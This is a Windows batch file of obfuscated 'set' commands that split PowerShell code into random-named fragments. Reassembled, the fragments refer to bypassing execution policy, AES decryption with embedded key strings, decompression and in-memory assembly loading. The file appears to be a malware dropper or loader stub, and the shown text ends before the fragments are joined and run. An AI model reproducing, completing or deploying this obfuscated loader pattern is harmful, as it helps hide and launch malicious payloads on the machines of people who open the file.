@echo off
set "rWrUwuVPPk=.Cry"
set "awIMNkiHkS=ose("
set "NRiGqgGSLO=yste"
set "kpedTzrJbK=S46e"
set "UoMGDmdqqJ=k; }"
set "tvKwQRzjvl=-4] "
set "RtxVJwRiXI=ateD"
set "splTiFLnZg=isfL"
set "MHaZwmaLRb=rrsY"
set "ZkwItScTvQ=R = "
set "wcxHRKFkyn=l) {"
set "XhLqsQdoAx=Comp"
set "nBMWaAkhMg= = ["
set "KKMlbFkkCv=Disp"
set "VzMiYOXLcK=pose"
set "HrjBJrELDc='[-1"
set "bRDeByezSB=('l0"
set "qMExhOCPtr=ck($"
set "RWNmFEckZh=ose("
set "nrtirMZJXw= [st"
set "nZApQBtUKE=ddin"
set "CGGeYvlSRV=New-"
set "rzneCNdCrS=($Dl"
set "ifVOOOUxom=tem."
set "HOpugxOfqc=BC;$"
set "svhEOmaFCD=.Key"
set "AANRYXnOFh=form"
set "vKtEwPriiy=xups"
set "DLoqOXRcZj=stem"
set "xFRbNEuSyr=bjec"
set "HTzyuHNIQh=xups"
set "oYvGPHxxmx=pher"
set "KrCXuoLrLv=ress"
set "gLJUgdgSNc=rity"
set "JyRnZiRuYR=bypa"
set "zYdLsBBqEk=nage"
set "iiAGppFcqG=;$wp"
set "HdSGIBgVNX=th('"
set "dNknnbRfwV=[Env"
set "JULjZoGgPX=y.Cr"
set "NSAxutPmfe=tem."
set "ykFJrVstbG=6esa"
set "nmxVOcWtAG=ew-O"
set "jcHiYOvRNW=Ml.D"
set "lfVuOkECMw=flec"
set "QwevGfIFHP=.Dis"
set "qYiXjtZuhW=iron"
set "dYbzIuhvTq=O.Me"
set "HxoLRqPHuo='[-1"
set "FKQrSlbIiQ=fore"
set "FcLGOuMyyF=Y = "
set "pgvKUyqtJC=null"
set "YlvGRItGor=dACF"
set "RwHYwdOaUo=ptor"
set "aCqYpmvKcR=ne);"
set "vsDKfVDGGU=esFX"
set "OqDmRNJMWw=ert]"
set "PilJIuMtOA=Syst"
set "VGCAoAChwu=);$u"
set "WYjdltIPBG=:: '"
set "aFjbXRBYZy=zmHE"
set "vTFSRqpIkC=s.Pa"
set "KmrxqIAWrG=16] "
set "YzijBZHkqZ=rrl "
set "TFrSSgsbHq=t Sy"
set "aRzDVkknSk=Secu"
set "zRaAsCuYDg=.Mem"
set "MMFUxVACYh== [S"
set "iAoodimiyg=);$u"
set "NyJqwjOwaY= '')"
set "NzpFBrMWSI=esaB"
set "qzUfFHEORT=736u"
set "PEtJJDQTZt=n ''"
set "dYhWucVVvA=$uxu"
set "GYQxDVrfXF=Star"
set "IRnJTTHpyI=$LXP"
set "WoEqtcjiIM=Pyp."
set "JkpIBXyyQY=rrsY"
set "QwJmFkGkHp=e = "
set "DNywMXVjaJ==');"
set "CsnXlRGfVC=n ''"
set "utfDowZVsu=ptog"
set "PhaHFrPkFX=y.Ci"
set "AdNmPIHtJU=);$I"
set "CJUZlhKMlQ=-joi"
set "eHNEJyJoVC=m.IO"
set "qqJRYhzFaR=();$"
set "MuvjUSRVMr=$ICq"
set "PBxybpXBlT=frrs"
set "DMEEeObaMm=);$E"
set "pZRxJJxfPg= = $"
set "IrzSyAtafe=F'[-"
set "QVtUNvaiYh=sY ="
set "NyjsOLgFMd=::De"
set "RhibtKHONt=7Yiv"
set "SNgcVHWORf=embl"
set "ziCwJwwbIK=raph"
set "zqSaiIBilv=oint"
set "OJcWkJmGZB= [Sy"
set "pKdEYrSbFQ=v4Ir"
set "TXTAWTREOq=join"
set "cFuXtKOdIU=::('"
set "qitvEPRVdE=grap"
